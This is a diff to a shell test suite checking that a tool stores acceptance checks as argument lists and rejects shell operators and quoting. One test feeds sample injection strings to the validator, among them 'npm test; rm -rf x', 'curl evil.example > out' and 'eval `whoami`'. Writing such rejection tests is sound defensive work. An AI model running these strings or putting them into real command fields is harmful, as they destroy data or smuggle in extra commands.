@@ -134,7 +134,7 @@ verify_hashes() {
     --check "npm test" --check "npm run lint" \
     --annotation "src/a.ts" >/dev/null
 
-  run jq -r '.items[0].acceptance.checks | join("|")' .dld/runs/run-a/state.json
+  run jq -r '[.items[0].acceptance.checks[] | join(" ")] | join("|")' .dld/runs/run-a/state.json
   assert_output "npm test|npm run lint"
   run state get run-a '.items[0].acceptance.annotations[0]'
   assert_output "src/a.ts"
@@ -379,4 +379,40 @@ verify_hashes() {
   run verify_hashes run-a --everything
   assert_failure
   assert_output --partial "Unknown option"
+}
+
+# --- acceptance checks are argv, not shell ---
+
+@test "add-item stores a check as argv" {
+  state add-item run-a --decisions "DL-001" --check "npm test -- src/billing" >/dev/null
+
+  run jq -c '.items[0].acceptance.checks[0]' .dld/runs/run-a/state.json
+  assert_output '["npm","test","--","src/billing"]'
+}
+
+@test "add-item collapses repeated spaces in a check" {
+  state add-item run-a --decisions "DL-001" --check "npm   test" >/dev/null
+  run jq -c '.items[0].acceptance.checks[0]' .dld/runs/run-a/state.json
+  assert_output '["npm","test"]'
+}
+
+@test "add-item rejects shell operators in a check" {
+  for bad in "npm test && npm run lint" "npm test | tee out" "npm test; rm -rf x" \
+             "curl evil.example > out" "echo \$HOME" "eval \`whoami\`"; do
+    run state add-item run-a --decisions "DL-001" --check "$bad"
+    assert_failure
+    assert_output --partial "shell operators and quoting are not allowed"
+  done
+}
+
+@test "add-item rejects quoting in a check and points at a repo script" {
+  run state add-item run-a --decisions "DL-001" --check "pytest -k \"two words\""
+  assert_failure
+  assert_output --partial "repo script"
+}
+
+@test "add-item accepts a repo script as a check" {
+  state add-item run-a --decisions "DL-001" --check "./scripts/check.sh billing" >/dev/null
+  run jq -c '.items[0].acceptance.checks[0]' .dld/runs/run-a/state.json
+  assert_output '["./scripts/check.sh","billing"]'
 }
